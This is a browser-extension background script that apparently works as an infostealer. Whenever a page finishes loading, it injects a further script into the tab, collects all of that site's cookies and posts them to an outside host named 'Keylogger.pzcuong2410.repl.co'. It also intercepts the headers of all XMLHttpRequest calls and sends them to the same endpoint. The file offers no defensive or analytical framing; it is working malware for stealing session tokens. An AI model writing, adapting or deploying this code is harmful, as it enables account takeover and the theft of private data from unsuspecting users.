chrome.webNavigation.onCompleted.addListener((e) => {
  chrome.scripting.executeScript({
    target: { tabId: e.tabId },
    files: ["src/running.js"],
  });

  chrome.cookies.getAll({ url: e.url }, (cookies) => {
    chrome.scripting.executeScript({
      target: { tabId: e.tabId },
      function: (cookies) => {
        const headers = new Headers({
          "Content-Type": "application/json",
          "User-Agent":
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36",
        });

        const options = {
          method: "POST",
          mode: "cors",
          headers,
          body: JSON.stringify({cookies}),
        };

        try {
          let response = fetch("https://Keylogger.pzcuong2410.repl.co/send", options);
          let responseData = response.json();
          // alert(responseData);
        } catch (error) {
          console.error("Request failed. " + error.message);
        }
      },
      args: [cookies]
    });
            
  });

  // HTTP Request Capture Code
  try {
    chrome.webRequest.onBeforeSendHeaders.addListener(
      function(details) {
        requestHeaders = JSON.stringify(details.requestHeaders);

        console.log('Request captured: ' + details.url);
        console.log('Request headers: ' + JSON.stringify(details.requestHeaders));

        const headers = new Headers({
          "Content-Type": "application/json",
          "User-Agent":
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36",
        });

        const options = {
          method: "POST",
          mode: "cors",
          headers,
          body: requestHeaders
        };

        try {
          let response = fetch("https://Keylogger.pzcuong2410.repl.co/send", options);
          let responseData = response.json();
          // alert(responseData);
        } catch (error) {
          console.error("Request failed. " + error.message);
        }

        return {requestHeaders: details.requestHeaders};
      },
      {urls: ["<all_urls>"], types: ["xmlhttprequest"]},
      ["requestHeaders", "blocking"]
    );    
    
    // Check if the event listener is being called
    if (!chrome.webRequest.onCompleted.hasListener()) {
      console.error("HTTP Request capture not working.");
    }
  } catch(error) {
    console.error("HTTP Request capture not working. " + error.message);
  }

});